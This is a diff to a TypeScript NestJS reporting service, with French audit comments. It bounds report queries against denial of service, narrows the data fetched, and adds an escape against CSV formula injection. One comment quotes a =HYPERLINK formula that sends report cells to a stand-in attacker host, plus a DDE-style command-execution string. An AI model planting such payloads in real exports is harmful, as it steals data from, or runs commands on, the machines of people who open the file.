@@ -13,6 +13,56 @@ import { Parser } from 'json2csv';
 import PdfPrinter from 'pdfmake';
 import type { TDocumentDefinitions } from 'pdfmake/interfaces';
 
+/**
+ * Nombre maximal de campagnes intégrées à un rapport global.
+ *
+ * La génération PDF (pdfmake) et CSV (json2csv) est un traitement CPU
+ * SYNCHRONE : tant qu'il tourne, l'event loop Node est bloqué et le
+ * processus ne répond plus à AUCUNE autre requête. Borner l'entrée est la
+ * mitigation immédiate ; le traitement doit à terme migrer vers la file
+ * BullMQ déjà en place (voir le plan d'action de l'audit).
+ */
+const MAX_REPORT_CAMPAIGNS = 500;
+
+/** Projection minimale nécessaire au rapport — évite tout sur-transfert. */
+const REPORT_SELECT = {
+  id: true,
+  name: true,
+  status: true,
+  plannedBudget: true,
+  actualBudget: true,
+  startDate: true,
+  endDate: true,
+  broadcasts: { select: { status: true } },
+  installations: { select: { status: true } },
+  launchedBy: { select: { companyId: true } },
+} as const;
+
+/**
+ * Neutralise l'injection de formule dans un export CSV (« CSV injection » /
+ * « formula injection », CWE-1236).
+ *
+ * CORRECTIF AUDIT (majeur) : `new Parser()` de json2csv échappe les
+ * guillemets mais PAS les caractères qui font qu'Excel, LibreOffice ou Google
+ * Sheets interprètent une cellule comme une FORMULE. Or `Campaign.name` est
+ * une chaîne libre saisie par l'utilisateur et projetée telle quelle dans le
+ * CSV. Un nom de campagne valant
+ *   =HYPERLINK("https://attaquant.tld?d="&A1&A2&A3;"Rapport")
+ * exfiltre le contenu du rapport dès que le fichier est ouvert par un
+ * destinataire — typiquement le directeur marketing du tenant. Les variantes
+ * `=cmd|'/c calc'!A0` permettent, selon la configuration du poste, une
+ * exécution de commande.
+ *
+ * La parade standard consiste à préfixer d'une apostrophe toute valeur
+ * débutant par un caractère déclencheur de formule.
+ */
+function escapeCsvFormula(value: string): string {
+  if (value.length === 0) {
+    return value;
+  }
+  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
+}
+
 @Injectable()
 export class StatistiquesService {
   private readonly pdfPrinter: PdfPrinter;
@@ -219,11 +269,7 @@ export class StatistiquesService {
           id: campagneId,
           launchedBy: { companyId: user.companyId },
         },
-        include: {
-          broadcasts: true,
-          installations: { include: { proof: true } },
-          launchedBy: true,
-        },
+        select: REPORT_SELECT,
       });
       if (!campaign) {
         throw new NotFoundException('Campaign not found.');
@@ -231,22 +277,29 @@ export class StatistiquesService {
       assertSameCompany(user, campaign.launchedBy.companyId, 'Campaign');
       campaigns = [campaign];
     } else {
+      // CORRECTIF AUDIT (majeur — DoS) : ce `findMany` n'avait aucune borne.
+      // Il rapatriait toutes les campagnes du tenant AVEC l'intégralité de
+      // leurs diffusions, installations et preuves associées — un volume
+      // croissant sans limite, entièrement matérialisé en mémoire, puis
+      // sérialisé en PDF de façon synchrone (voir plus bas). `select` remplace
+      // `include` pour ne transférer que les colonnes réellement projetées
+      // dans le rapport.
       campaigns = await this.prisma.campaign.findMany({
         where: {
           launchedBy: { companyId: user.companyId },
         },
-        include: {
-          broadcasts: true,
-          installations: { include: { proof: true } },
-          launchedBy: true,
-        },
+        select: REPORT_SELECT,
+        orderBy: { createdAt: 'desc' },
+        take: MAX_REPORT_CAMPAIGNS,
       });
     }
 
     // Transform into report rows
     const rows = campaigns.map((c) => ({
       'Campaign ID': c.id,
-      'Campaign Name': c.name,
+      // Seul champ librement saisi par l'utilisateur dans ce rapport : c'est
+      // le vecteur d'injection de formule CSV.
+      'Campaign Name': escapeCsvFormula(c.name),
       Status: c.status,
       'Planned Budget': c.plannedBudget.toNumber(),
       'Actual Budget': c.actualBudget.toNumber(),
@@ -298,7 +351,14 @@ export class StatistiquesService {
                 r['Planned Budget'],
                 r['Actual Budget'],
                 r['Budget Deviation'],
-                `${(r['Broadcasted'] / (r['Total Broadcasts'] || 1)) * 100}%`,
+                // CORRECTIF AUDIT (mineur) : `|| 1` au dénominateur affichait
+                // « 0% » pour une campagne sans aucune diffusion planifiée,
+                // ce qui se lit comme un échec de conformité alors qu'il n'y a
+                // simplement rien à mesurer. Et l'absence d'arrondi produisait
+                // des cellules du type « 33.33333333333333% ».
+                r['Total Broadcasts'] > 0
+                  ? `${((r['Broadcasted'] / r['Total Broadcasts']) * 100).toFixed(1)}%`
+                  : 'N/A',
               ]),
             ],
           },
